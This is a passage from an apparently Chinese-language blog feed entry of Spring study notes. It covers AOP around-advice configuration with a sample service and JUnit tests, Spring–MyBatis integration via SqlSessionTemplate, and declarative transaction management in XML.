id=&quot;point&quot; expression=&quot;execution(* org.yuyr757.services.UserServiceImpl.*(..))&quot;/&gt;&lt;!--            &lt;aop:before method=&quot;before&quot; pointcut-ref=&quot;point&quot;/&gt;--&gt;&lt;!--            &lt;aop:after-returning method=&quot;afterReturning&quot; pointcut-ref=&quot;point&quot;/&gt;--&gt;&lt;!--            &lt;aop:after-throwing method=&quot;afterThrowing&quot; pointcut-ref=&quot;point&quot;/&gt;--&gt;            &lt;aop:around method=&quot;around&quot; pointcut-ref=&quot;point&quot;/&gt;&lt;!--            &lt;aop:after method=&quot;after&quot; pointcut-ref=&quot;point&quot;/&gt;--&gt;        &lt;/aop:aspect&gt;    &lt;/aop:config&gt;</code></pre><pre><code class="java">package org.yuyr757.services;public class UserServiceImpl implements UserService&#123;    public int add(int num) &#123;        if (num &lt; 50) throw new IllegalArgumentException();        System.out.println(&quot;增加了一个用户&quot;);        return num;    &#125;    public void delete() &#123;        System.out.println(&quot;删除了一个用户&quot;);    &#125;    public void update() &#123;        System.out.println(&quot;修改了一个用户&quot;);    &#125;    public void select() &#123;        System.out.println(&quot;查询了一个用户&quot;);    &#125;&#125;</code></pre><pre><code class="java">package org.yuyr757.services;public interface UserService &#123;    public int add(int num);    public void delete();    public void update();    public void select();&#125;</code></pre><pre><code class="java">import org.junit.Test;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;import org.yuyr757.services.UserService;public class TestAop1 &#123;    public static final ApplicationContext context;    static&#123;        context = new ClassPathXmlApplicationContext(&quot;applicationContext.xml&quot;);    &#125;    @Test    public void testAopAroundReturning()&#123;        System.out.println(&quot;【开始测试正常返回时的通知结果】&quot;);        UserService userService = context.getBean(&quot;userServiceImpl&quot;, UserService.class);        int num = userService.add(188);        System.out.println(num);    &#125;    @Test    public void testAopAroundThrowing()&#123;        System.out.println(&quot;【开始测试报异常时的通知结果】&quot;);        UserService userService = context.getBean(&quot;userServiceImpl&quot;, UserService.class);        int num = userService.add(1);        System.out.println(num);    &#125;&#125;</code></pre><h2 id="三、整合spring和mybatis"><a href="#三、整合spring和mybatis" class="headerlink" title="三、整合spring和mybatis"></a>三、整合spring和mybatis</h2><p>需要用到<code>mybatis-spring</code>这个包。</p><p>此外对于每个mapper接口我们必须手动写一个实现类，然后注册到spring的bean中，实现类使用的SqlSession要使用SqlSessionTemplate。其他的都和mybatis一样配置</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd        http://www.springframework.org/schema/context        https://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;    &lt;!-- 使用spring数据源代替mybatis数据源 --&gt;    &lt;bean id=&quot;datasource&quot; class=&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot;&gt;        &lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.cj.jdbc.Driver&quot;/&gt;        &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/mybatis?useUnicode=true&amp;amp;characterEncoding=utf-8&amp;amp;useSSL=true&amp;amp;serverTimezone=UTC&quot;/&gt;        &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt;        &lt;property name=&quot;password&quot; value=&quot;root&quot;/&gt;    &lt;/bean&gt;    &lt;!-- sqlSessionFactory --&gt;    &lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt;        &lt;property name=&quot;dataSource&quot; ref=&quot;datasource&quot;/&gt;        &lt;!-- 绑定mybatis配置文件 --&gt;        &lt;property name=&quot;configLocation&quot; value=&quot;classpath:mybatis-config.xml&quot;/&gt;        &lt;!-- 一般这里只需要绑定配置文件就可以，mybatis的配置还是在mybatis-config.xml中配置 --&gt;    &lt;/bean&gt;    &lt;!-- 这个sqlSessionTemplate是SqlSession的一个实现类，我们以后就不用手动调用openSession()方法来获得SqlSession对象 --&gt;    &lt;bean id=&quot;sqlSessionTemplate&quot; class=&quot;org.mybatis.spring.SqlSessionTemplate&quot;&gt;        &lt;!-- 因为这个类没有setter方法，所以只能通过有参构造方法来初始化 --&gt;        &lt;constructor-arg index=&quot;0&quot; ref=&quot;sqlSessionFactory&quot;/&gt;    &lt;/bean&gt;&lt;/beans&gt;</code></pre><h2 id="四、spring的事务管理"><a href="#四、spring的事务管理" class="headerlink" title="四、spring的事务管理"></a>四、spring的事务管理</h2><h3 id="1、编程式事务管理"><a href="#1、编程式事务管理" class="headerlink" title="1、编程式事务管理"></a>1、编程式事务管理</h3><p>手动在程序中写try catch来实现事务就是编程式事务管理。</p><h3 id="2、声明式事务管理"><a href="#2、声明式事务管理" class="headerlink" title="2、声明式事务管理"></a>2、声明式事务管理</h3><p>把事务交给IOC容器管理就是声明式事务管理。配置如下：</p><pre><code class="xml">&lt;!-- 声明式事务管理 --&gt;&lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt;    &lt;property name=&quot;dataSource&quot; ref=&quot;datasource&quot;/&gt;&lt;/bean&gt;&lt;!-- 结合AOP实现事务织入 --&gt;&lt;!-- 配置事务通知的的类：需要导入tx命名空间 --&gt;&lt;tx:advice id=&quot;txAdvisor&quot; transaction-manager=&quot;transactionManager&quot;&gt;    &lt;!-- name：给哪些方法配置事务，propagation：配置事务的传播特性 --&gt;    &lt;tx:attributes&gt;        &lt;tx:method name=&quot;add*&quot; propagation=&quot;REQUIRED&quot;/&gt;        &lt;tx:method name=&quot;delete*&quot; propagation=&quot;REQUIRED&quot;/&gt;        &lt;tx:method name=&quot;update*&quot; propagation=&quot;REQUIRED&quot;/&gt;        &lt;tx:method name=&quot;select*&quot; read-only=&quot;true&quot;/&gt;    &lt;/tx:attributes&gt;&lt;/tx:advice&gt;&lt;!-- 配置事务的切入点 --&gt;&lt;aop:config&gt;    &lt;aop:pointcut id=&quot;txPointCut&quot; expression=&quot;execution(* org.yuyr757.mapper.*.*(..))&quot;/&gt;    &lt;aop:advisor advice-ref=&quot;txAdvisor&quot; pointcut-ref=&quot;txPointCut&quot;/&gt;&lt;/aop:config&gt;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;代码地址：&lt;a href=&quot;https://github.com/yury757/SpringStudy&quot;&gt;yury757/SpringStudy (github.com)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;font color=&quot;Red&quot;&gt;spring：约定大于配置！&lt;/font&gt;</summary>
      
    
    
    
    <category term="java" scheme="https://yury757.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://yury757.github.io/tags/java/"/>
    
    <category term="spring" scheme="https://yury757.github.io/tags/spring/"/>
    
  </entry>
  
</feed>
